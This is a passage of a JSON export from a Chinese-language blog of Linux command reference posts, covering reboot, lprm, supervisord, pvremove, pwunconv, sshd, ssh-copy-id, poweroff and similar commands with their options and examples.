17:40:07","dateFormat":"2022-02-01"},{"content":"重新启动正在运行的 Linux 操作系统。 补充说明 reboot 命令用来重新启动正在运行的 Linux 操作系统。 语法 reboot (选项) 选项 -d：重新开机时不把数据写入记录文件/var/tmp/wtmp。本参数具有“-n”参数效果； -f：强制重新开机，不调用 shutdown 指令的功能； -i：在重开机之前，先关闭所有网络界面； -n：重开机之前不检查是否有未结束的程序； -w：仅做测试，并不真正将系统重新开机，只会把重开机的数据写入/var/log 目录下的 wtmp 记录文件。 实例 reboot //重开机。 reboot -w //做个重开机的模拟（只有纪录并不会真的重开机）。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"reboot","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/reboot/","stats":{"text":"1 min read","time":41000,"words":189,"minutes":1},"date":"2022-02-01 17:39:50","dateFormat":"2022-02-01"},{"content":"删除打印队列中的打印任务。 补充说明 lprm 命令用于删除打印队列中的打印任务。尚未完成的打印机任务会被放在打印机贮列之中，这个命令可用来将常未送到打印机的任务取消。 语法 lprm (选项) (参数) 选项 -E：与打印服务器连接时强制使用加密； -P：指定接受打印任务的目标打印机； -U：指定可选的用户名。 参数 打印任务：指定需删除的打印任务号。 实例 将打印机 hpprint 中的第 102 号任务移除： lprm -Phpprint 102 将第 101 号任务由预设打印机中移除： lprm 101 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lprm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lprm/","stats":{"text":"1 min read","time":37000,"words":176,"minutes":1},"date":"2022-02-01 17:39:34","dateFormat":"2022-02-01"},{"content":"配置后台服务/常驻进程的进程管家工具。 安装 # 安装 supervisordapt-get install supervisor 实例 生成配置文件 /etc/supervisord.conf [program:app] command=/usr/bin/gunicorn -w 1 wsgiapp:application directory=/srv/www user=www-data supervisord: 启动 supervisor 服务 supervisorctl start app supervisorctl stop app supervisorctl reload # 修改/添加配置文件需要执行这个 下载地址 https://pypi.python.org/pypi/meld3 https://pypi.python.org/pypi/supervisor ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"supervisord","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/supervisord/","stats":{"text":"1 min read","time":27000,"words":96,"minutes":1},"date":"2022-02-01 17:39:01","dateFormat":"2022-02-01"},{"content":"删除一个存在的物理卷。 补充说明 pvremove 命令用于删除一个存在的物理卷。使用 pvremove 指令删除物理卷时，它将 LVM 分区上的物理卷信息删除，使其不再被视为一个物理卷。 语法 pvremove (选项) (参数) 选项 -d # 调试模式； -f # 强制删除； -y # 对提问回答“yes”。 参数 物理卷：指定要删除的物理卷对应的设备文件名。 实例 使用 pvremove 指令删除物理卷/dev/sdb2。在命令行中输入下面的命令： pvremove /dev/sdb2 # 删除物理卷 Labels on physical volume &quot;/dev/sdb2&quot; successfully wiped ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pvremove","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pvremove/","stats":{"text":"1 min read","time":35000,"words":158,"minutes":1},"date":"2022-02-01 17:38:35","dateFormat":"2022-02-01"},{"content":"向系统当前所有打开的终端上输出信息。 补充说明 wall 命令用于向系统当前所有打开的终端上输出信息。通过 wall 命令可将信息发送给每位同意接收公众信息的终端机用户，若不给予其信息内容，则 wall 命令会从标准输入设备读取数据，然后再把所得到的数据传送给所有终端机用户。 语法 wall (参数) 参数 消息：指定广播消息。 实例 [root@localhost ~]# wall this is a test line Broadcast message from root (pts/1) (Fri Dec 20 11:36:51 2013): this is a test line ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"wall","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/wall/","stats":{"text":"1 min read","time":37000,"words":159,"minutes":1},"date":"2022-02-01 17:38:15","dateFormat":"2022-02-01"},{"content":"创建 RPM 的二进制软件包和源码软件包。 补充说明 rpmbuild 命令被用于创建 rpm 的二进制软件包和源码软件包。 语法 rpmbuild (选项) 选项 --initdb：初始化 RPM 数据库； --rebuilddb：从已安装的包头文件，方向重建 RPM 数据库； -ba：创建二进制和源代码包； -bb：创建二进制代码包； -bs：创建源代码包。 实例 rpmbuild -ba 'spec 文件路径 ' build 完后，可以在/usr/src/redhat/RPMS/下找到二进制 rpm 包，rpm 包按照其对应的 cpu 体系结构分类，通常在/usr/src/redhat/RPMS/i386目录下。/usr/src/redhat/SRPMS/下找到源码 rpm 包，此时由于是源代码，所以无须按体系结构分类。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rpmbuild","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rpmbuild/","stats":{"text":"1 min read","time":42000,"words":185,"minutes":1},"date":"2022-02-01 17:38:04","dateFormat":"2022-02-01"},{"content":"集中管理系统的各种服务。 补充说明 ntsysv 命令提供了一个基于文本界面的菜单操作方式，集中管理系统不同的运行等级下的系统服务启动状态。在 RedHat 各个发行版，CentOS 各个版本，都自带这个工具。它具有互动式操作界面，您可以轻易地利用方向键和空格键等，开启，关闭操作系统在每个执行等级中，所要执行的系统服务。 语法 ntsysv (选项) 选项 --leve：指定运行等级； --back：在互动式界面里，显示 Back 钮，而非 cancel 钮。 实例 输入 ntsysv 命令后，出现一个交互式的管理菜单，如下： !ntsysv 使用空格键选择或者取消选项！ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ntsysv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ntsysv/","stats":{"text":"1 min read","time":40000,"words":195,"minutes":1},"date":"2022-02-01 17:36:27","dateFormat":"2022-02-01"},{"content":"关闭正在运行的 Linux 操作系统。 补充说明 halt 命令用来关闭正在运行的 Linux 操作系统。halt 命令会先检测系统的 runlevel，若 runlevel 为 0 或 6，则关闭系统，否则即调用 shutdown 来关闭系统。 语法 halt (选项) 选项 -d：不要在 wtmp 中记录； -f：不论目前的 runlevel 为何，不调用 shutdown 即强制关闭系统； -i：在 halt 之前，关闭全部的网络界面； -n：halt 前，不用先执行 sync； -p：halt 之后，执行 poweroff； -w：仅在 wtmp 中记录，而不实际结束系统。 实例 halt -p # 关闭系统后关闭电源。 halt -d # 关闭系统，但不留下纪录。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"halt","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/halt/","stats":{"text":"1 min read","time":39000,"words":171,"minutes":1},"date":"2022-02-01 17:35:20","dateFormat":"2022-02-01"},{"content":"用来关闭用户的投影密码。 补充说明 pwunconv 命令与 pwconv 功能相反，用来关闭用户的投影密码。它会把密码从 shadow 文件内，重回存到 passwd 文件里。 语法 pwunconv 实例 pwunconv # 关闭影子密码 cat /etc/passwd | grep test # 发现密码已经在passwd文件中了 test:$6$nYOEWamm$bz07nlv/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.0:3001:3001::/home/test:/bin/sh ls /etc/shadow # 查看影子文件，提示没有这个文件或目录 ls: cannot access /etc/shadow: No such file or directory ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pwunconv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pwunconv/","stats":{"text":"1 min read","time":31000,"words":125,"minutes":1},"date":"2022-02-01 17:35:00","dateFormat":"2022-02-01"},{"content":"等待进程执行完后返回。 补充说明 wait 命令用来等待指令的指令，直到其执行完毕后返回终端。该指令常用于 shell 脚本编程中，待指定的指令执行完成后，才会继续执行后面的任务。该指令等待作业时，在作业标识号前必须添加备份号&quot;%&quot;。 语法 wait (参数) 参数 进程或作业标示：指定进程号或者作业号。 实例 使用命令 wait 等待作业号为 1 的作业完成后再返回，输入如下命令： wait %1 #等待作业号为 3 的作业完成 执行上面的指令后，将输出指定作业号的指令，如下所示： find / -name password ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"wait","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/wait/","stats":{"text":"1 min read","time":40000,"words":189,"minutes":1},"date":"2022-02-01 17:34:45","dateFormat":"2022-02-01"},{"content":"用于创建一个新的工作组。 补充说明 groupadd 命令用于创建一个新的工作组，新工作组的信息将被添加到系统文件中。 语法 groupadd (选项) (参数) 选项 -g：指定新建工作组的 id； -r：创建系统工作组，系统工作组的组 ID 小于 500； -K：覆盖配置文件“/ect/login.defs”； -o：允许添加组 ID 号不唯一的工作组。 参数 组名：指定新建工作组的组名。 实例 建立一个新组，并设置组 ID 加入系统： groupadd -g 344 username 此时在/etc/passwd文件中产生一个组 ID（GID）是 344 的项目。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"groupadd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/groupadd/","stats":{"text":"1 min read","time":36000,"words":164,"minutes":1},"date":"2022-02-01 17:34:30","dateFormat":"2022-02-01"},{"content":"显示压缩包中文件的内容。 补充说明 zcat 命令用于不真正解压缩文件，就能显示压缩包中文件的内容的场合。 语法 zcat (选项) (参数) 选项 -S：指定 gzip 格式的压缩包的后缀。当后缀不是标准压缩包后缀时使用此选项； -c：将文件内容写到标注输出； -d：执行解压缩操作； -l：显示压缩包中文件的列表； -L：显示软件许可信息； -q：禁用警告信息； -r：在目录上执行递归操作； -t：测试压缩文件的完整性； -V：显示指令的版本信息； -l：更快的压缩速度； -9：更高的压缩比。 参数 文件：指定要显示其中文件内容的压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"zcat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/zcat/","stats":{"text":"1 min read","time":42000,"words":198,"minutes":1},"date":"2022-02-01 17:34:18","dateFormat":"2022-02-01"},{"content":"激活 Linux 内核中指定文件系统的磁盘配额功能。 补充说明 quotaon 命令用于激活 Linux 内核中指定文件系统的磁盘配额功能。执行 quotaon 指令可开启用户和群组的才磅秒年空间限制，各分区的文件系统根目录必须有 quota.user 和 quota.group 配置文件。 语法 quotaon (选项) (参数) 选项 -a：开启在/ect/fstab 文件里，有加入 quota 设置的分区的空间限制； -g：开启群组的磁盘空间限制； -u：开启用户的磁盘空间限制； -v：显示指令指令执行过程。 参数 文件系统：指定要激活磁盘配额功能的文件系统。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"quotaon","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/quotaon/","stats":{"text":"1 min read","time":39000,"words":181,"minutes":1},"date":"2022-02-01 17:34:06","dateFormat":"2022-02-01"},{"content":"报表的格式输出磁盘空间限制的状态。 补充说明 repquota 命令以报表的格式输出指定分区，或者文件系统的磁盘配额信息。 语法 repquota (选项) (参数) 选项 -a：列出在/etc/fstab 文件里，有加入 quota 设置的分区的使用状况，包括用户和群组； -g：列出所有群组的磁盘空间限制； -u：列出所有用户的磁盘空间限制； -v：显示该用户或群组的所有空间限制。 参数 文件系统：要打印报表的文件系统或者对应的设备文件名。 实例 显示所有文件系统的磁盘使用情况 repquota -a ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"repquota","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/repquota/","stats":{"text":"1 min read","time":37000,"words":176,"minutes":1},"date":"2022-02-01 17:33:52","dateFormat":"2022-02-01"},{"content":"列出 X 服务器内部所有定义的原子成分。 补充说明 xlsatoms 命令用于列出 X 服务器内部所有定义的原子成分，每个原子成分都有自身的编号。可利用参数设置列表范围，或直接指定欲查询的成分名称。 语法 xlsatoms (选项) 选项 -display&lt;显示器编号&gt;：指定 X Server 连接的显示器编号，该编号由&quot;0&quot;开始计算，依序递增； -format&lt;输出格式&gt;：设置成分清单的列表格式，您可使用控制字符改变显示样式； -name&lt;成分名称&gt;：列出指定的成分； -range&lt;列表范围&gt;：设置成分清单的列表范围。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xlsatoms","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xlsatoms/","stats":{"text":"1 min read","time":40000,"words":186,"minutes":1},"date":"2022-02-01 17:32:34","dateFormat":"2022-02-01"},{"content":"使用 named-checkzone 命令可以进行区域文件有效性检查和转换，必须指定区域名称和区域文件名称。 补充说明 named-checkzone 命令可以进行区域文件有效性检查和转换，必须指定区域名称和区域文件名称。 语法 named-checkzone [选项 ] [区域名 ] [区域文件名 ] 选项 -q 安静模式 -d 启用调试 -c &lt;类别&gt; 指定区域的类别。如果没指定就使用IN ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"named-checkzone","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/named-checkzone/","stats":{"text":"1 min read","time":26000,"words":123,"minutes":1},"date":"2022-02-01 17:31:00","dateFormat":"2022-02-01"},{"content":"将目标文件连接为可执行程序。 补充说明 ld 命令是 GNU 的连接器，将目标文件连接为可执行程序。 语法 ld(选项)(参数) ld [options] objfile ... 选项 -o：指定输出文件名； -e：指定程序的入口符号。 参数 目标文件：指定需要连接的目标文件。 实例 这告诉 ld 通过将文件“/lib/crt0.o”与“hello.o”和库“libc.a”链接起来，生成一个名为 output 的文件，该文件将来自标准搜索目录。 ld -o &lt;output&gt; /lib/crt0.o hello.o -lc ld -o output /lib/crt0.o hello.o -lc ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ld","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ld/","stats":{"text":"1 min read","time":37000,"words":153,"minutes":1},"date":"2022-02-01 17:29:11","dateFormat":"2022-02-01"},{"content":"为 MySQL 服务器用命令行方式导入数据。 补充说明 mysqlimport 命令为 mysql 数据库服务器提供了一种命令行方式导入数据工具，它从特定格式的文本文件中读取数据插入 MySQL 数据库表中。 语法 mysqlimport (选项) (参数) 选项 -D：导入数据前清空表； -f：出现错误时继续处理剩余的操作； -h：MySQL 服务器的 ip 地址或主机名； -u：连接 MySQL 服务器的用户名； -p：连接 MySQL 服务器的密码。 参数 数据库名：指定要导入的数据库名称； 文本文件：包含特定格式文本文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mysqlimport","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mysqlimport/","stats":{"text":"1 min read","time":36000,"words":168,"minutes":1},"date":"2022-02-01 17:28:20","dateFormat":"2022-02-01"},{"content":"显示系统负载状况。 补充说明 tload 命令以图形化的方式输出当前系统的平均负载到指定的终端。假设不给予终端机编号，则会在执行 tload 指令的终端机显示负载情形。 语法 tload (选项) (参数) 选项 -s：指定闲时的刻度； -d：指定间隔的时间（秒）。 参数 终端：指定显示信息的终端设备文件。 实例 使用 tload 命令查看系统负载情况： tload -d 1 0.08, 0.02,0.01 0.04, 0.01, 0.00 0.04, 0.01, 0.00 0.04, 0.01,0.00 0.06, 0.02, 0.00 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tload","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tload/","stats":{"text":"1 min read","time":38000,"words":158,"minutes":1},"date":"2022-02-01 17:27:08","dateFormat":"2022-02-01"},{"content":"打印可用的处理器单元数量。。 概要 nproc [OPTION]... 主要用途 打印可用的处理器单元数量。 选项 --all 打印已安装处理器的数量。 --ignore=N 如果可以的情况下，排除 N 个处理单元。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 例子 [root@localhost ~]# nproc 8 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 nproc，info coreutils 'nproc invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nproc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nproc/","stats":{"text":"1 min read","time":28000,"words":121,"minutes":1},"date":"2022-02-01 17:26:38","dateFormat":"2022-02-01"},{"content":"定义 DNS 系统中 FQDN 名称的域名。 补充说明 dnsdomainname 命令用于定义 DNS 系统中 FQDN 名称中的域名。 语法 dnsdomainname (选项) 选项 -v：详细信息模式，输出指令执行的详细信息。 实例 [root@AY1307311912260196fcZ ~]# dnsdomainname -v gethostname()=`AY1307311912260196fcZ' Resolving `AY1307311912260196fcZ' ... Result: h_name=`AY1307311912260196fcZ' Result: h_addr_list=`x.x.x.x' ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dnsdomainname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dnsdomainname/","stats":{"text":"1 min read","time":19000,"words":78,"minutes":1},"date":"2022-02-01 17:26:19","dateFormat":"2022-02-01"},{"content":"openssh 软件套件中的服务器守护进程。 补充说明 sshd 命令是 openssh 软件套件中的服务器守护进程。 语法 sshd (选项) 选项 -4：强制使用 IPv4 地址； -6：强制使用 IPv6 地址； -D：以后台守护进程方式运行服务器； -d：调试模式； -e：将错误发送到标准错误设备，而不是将其发送到系统日志； -f：指定服务器的配置文件； -g：指定客户端登录时的过期时间，如果在此期限内，用户没有正确认证，则服务器断开次客户端的连接； -h：指定读取主机 key 文件； -i：ssh 以 inetd 方式运行； -o：指定 ssh 的配置选项； -p：静默模式，没有任何信息写入日志； -t：测试模式。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sshd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sshd/","stats":{"text":"1 min read","time":44000,"words":204,"minutes":1},"date":"2022-02-01 17:26:07","dateFormat":"2022-02-01"},{"content":"显示 MySQL 中数据库相关信息。 补充说明 mysqlshow 命令用于显示 mysql 服务器中数据库、表和列表信息。 语法 mysqlshow (选项) (参数) 选项 -h：MySQL 服务器的 ip 地址或主机名； -u：连接 MySQL 服务器的用户名； -p：连接 MySQL 服务器的密码； --count：显示每个数据表中数据的行数； -k：显示数据表的索引； -t：显示数据表的类型； -i：显示数据表的额外信息。 参数 数据库信息：指定要显示的数据库信息，可以是一个数据库名，或者是数据库名和表名，或者是数据库名、表名和列名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mysqlshow","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mysqlshow/","stats":{"text":"1 min read","time":36000,"words":171,"minutes":1},"date":"2022-02-01 17:25:54","dateFormat":"2022-02-01"},{"content":"把本地的 ssh 公钥文件安装到远程主机对应的账户下。 补充说明 ssh-copy-id 命令可以把本地主机的公钥复制到远程主机的 authorized_keys 文件上，ssh-copy-id 命令也会给远程主机的用户主目录（home）和~/.ssh, 和~/.ssh/authorized_keys设置合适的权限。 语法 ssh-copy-id [-i [identity_file]] [user@]machine 选项 -i：指定公钥文件 实例 1、把本地的 ssh 公钥文件安装到远程主机对应的账户下： ssh-copy-id user@serverssh-copy-id -i ~/.ssh/id_rsa.pub user@server ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ssh-copy-id","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ssh-copy-id/","stats":{"text":"1 min read","time":34000,"words":140,"minutes":1},"date":"2022-02-01 17:25:20","dateFormat":"2022-02-01"},{"content":"Debian Linux 下的软件包触发器。 补充说明 dpkg-trigger 命令是 Debian Linux 下的软件包触发器。 语法 dpkg-trigger (选项) (参数) 选项 --check-supported：检查运行的 dpkg 是否支持触发器，返回值为 0，则支持触发器。--help：显示帮助信息； --admindir=&lt;目录&gt;：设置 dpkg 数据库所在的目录； --no-act：仅用于测试，不执行任何操作； --by-package=&lt;软件包&gt;：覆盖触发器等待者。 参数 触发器名：指定触发器名称。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-trigger","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-trigger/","stats":{"text":"1 min read","time":30000,"words":130,"minutes":1},"date":"2022-02-01 17:25:03","dateFormat":"2022-02-01"},{"content":"用于用户删除 LVM 卷组。 补充说明 vgremove 命令用于用户删除 LVM 卷组。当要删除的卷组上已经创建了逻辑卷时，vgremove 命令需要进行确认删除，防止误删除数据。 语法 vgremove (选项) (参数) 选项 -f：强制删除。 参数 卷组：指定要删除的卷组名称。 实例 使用 vgremove 命令删除 LVM 卷组&quot;vg1000&quot;。在命令行中输入下面的命令： [root@localhost ~]# vgremove vg1000 #删除卷组&quot;vg1000&quot; Volume group &quot;vg1000&quot; successfully removed ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgremove","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgremove/","stats":{"text":"1 min read","time":30000,"words":133,"minutes":1},"date":"2022-02-01 17:24:45","dateFormat":"2022-02-01"},{"content":"显示当前主机的十六进制数字标识。。 概要 hostid [OPTION]... 主要用途 显示当前主机的十六进制标识符。 用来限制软件的使用权限，不可改变。 选项 --help 显示帮助信息并退出。--version 显示版本信息并退出。 例子 [root@localhost ~]# hostid007f0100 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 hostid，info coreutils 'hostid invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"hostid","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/hostid/","stats":{"text":"1 min read","time":24000,"words":110,"minutes":1},"date":"2022-02-01 17:24:18","dateFormat":"2022-02-01"},{"content":"登录系统或切换用户身份。 补充说明 login 命令用于给出登录界面，可用于重新登录或者切换用户身份，也可通过它的功能随时更换登入身份。在 Slackware 发行版中 ，您可在命令后面附加欲登入的用户名称，它会直接询问密码，等待用户输入。当/etc/nologin文件存在时，系统只 root 帐号登入系统，其他用户一律不准登入。 语法 login (选项) (参数) 选项 -p：告诉 login 指令不销毁环境变量； -h：指定远程服务器的主机名。 参数 用户名：指定登录使用的用户名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"login","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/login/","stats":{"text":"1 min read","time":35000,"words":171,"minutes":1},"date":"2022-02-01 17:23:54","dateFormat":"2022-02-01"},{"content":"著名电子邮件服务器。 补充说明 sendmail 命令是一款著名的电子邮件传送代理程序，也就是平常说的电子邮件服务器，它基于标准的简单邮件传输协议（SMTP）。 语法 sendmail (选项) 选项 -bd：以守护进程方式运行指令； -bD：以前台运行方式运行； -bi：初始化别名数据库； -bm：以常规发送电子邮件； -bp：显示邮件的发送队列； -C：指定配置文件； -D：将调试的输出信息保存到日志文件，而不显示在标准输出设备上； -F：指定邮件发送者全名； -n：禁止使用邮件别名功能； -f：指定发件人的名字； -q：设置处理邮件队列中邮件的时间间隔。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sendmail","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sendmail/","stats":{"text":"1 min read","time":42000,"words":201,"minutes":1},"date":"2022-02-01 17:23:42","dateFormat":"2022-02-01"},{"content":"扫描逻辑卷。 补充说明 lvscan 命令用于扫描当前系统中存在的所有的 LVM 逻辑卷。使用 lvscan 指令可以发现系统中的所有逻辑卷，及其对应的设备文件。 语法 lvscan (选项) 选项 -b：显示逻辑卷的主设备和次设备号。 实例 使用 lvscan 命令扫描系统中的所有逻辑卷。在命令行中输入下面的命令： [root@localhost ~]# lvscan #扫描所有的逻辑卷 输出信息如下： ACTIVE '/dev/vg1000/lvol0' [200.00 MB] inherit ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lvscan","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lvscan/","stats":{"text":"1 min read","time":29000,"words":135,"minutes":1},"date":"2022-02-01 17:23:12","dateFormat":"2022-02-01"},{"content":"设置当前终端的写权限。 补充说明 mesg 命令用于设置当前终端的写权限，即是否让其他用户向本终端发信息。将 mesg 设置 y 时，其他用户可利用 write 命令将信息直接显示在您的屏幕上。 语法 mesg (参数) 参数 y/n：y 表示运行向当前终端写信息，n 表示禁止向当前终端写信息。 实例 [root@localhost ~]# mesg y #允许系统用户将信息直接显示在你的屏幕上。 [root@localhost ~]# mesg n #不允许系统用户将信息直接显示在你的屏幕上。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mesg","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mesg/","stats":{"text":"1 min read","time":34000,"words":157,"minutes":1},"date":"2022-02-01 17:22:53","dateFormat":"2022-02-01"},{"content":"关闭 Linux 系统，关闭记录会被写入到/var/log/wtmp 日志文件中。 补充说明 grename 命令可以重命名卷组的名称。 语法 poweroff [选项 ] 选项 -n 关闭之前不同步 -p 当被称为halt时关闭电源 -v 增加输出，包括消息 -q 降低输出错误唯一的消息 -w 并不实际关闭系统，只是写入/var/log/wtmp文件中 -f 强制关机，不调用shutdown 例子 关闭 Linux 系统。 [root@localhost ~]# poweroff ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"poweroff","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/poweroff/","stats":{"text":"1 min read","time":28000,"words":124,"minutes":1},"date":"2022-02-01 17:22:33","dateFormat":"2022-02-01"},{"content":"纯文本界面的 WWW 浏览器。 补充说明 elinks 命令能实现一个纯文本界面的 WWW 浏览器，操作方式与“lynx”类似。 语法 elinks (选项) (参数) 选项 -anonymous：是否使用匿名帐号方式； -auto-submit：对于偶然遇到的第一个表单是否自动提交； -config-dir：指定 elinks 指令运行时读取和写入自身的配置和运行状态的存放目录； -dump：将 HTML 文档以纯文本的方式打印到标准输出设备； -version：显示指令的版本信息； -h：显示帮助信息。 参数 URL：指定要访问的 URL 地址。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"elinks","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/elinks/","stats":{"text":"1 min read","time":34000,"words":160,"minutes":1},"date":"2022-02-01 17:22:22","dateFormat":"2022-02-01"},{"content":"显示文件中以指定字符串开头的任意行。 补充说明 look 命令用于显示文件中以指定字符串开头的任意行。 语法 look (选项) (参数) 选项 -a：使用另一个字典文件 web2，该文件也位于/usr/dict 目录下； -d：只对比英文字母和数字，其余一概忽略不予比对； -f：忽略字符大小写差别； -t&lt;字尾字符串&gt;：设置字尾字符串。 参数 字符串：指定要查找的字符串； 文件：指定要查找的目标文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"look","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/look/","stats":{"text":"1 min read","time":31000,"words":146,"minutes":1},"date":"2022-02-01 17:21:51","dateFormat":"2022-02-01"},{"content":"返回状态为成功。。 概要 &lt;span class=&quot;token boolean&quot;&gt;true 主要用途 用于和其他命令进行逻辑运算。 返回值 返回状态总是成功； 返回值为 0。 例子 # 当你的脚本设置set -e时，任何返回值为失败的命令都会使得脚本退出。 set -e # 如何临时跳过呢？下面的语句使用逻辑或操作符连接true，返回值一定为真。 some_command || true # 当然，和python的pass一样，也可以用作条件语句临时占位。 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"true","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/true/","stats":{"text":"1 min 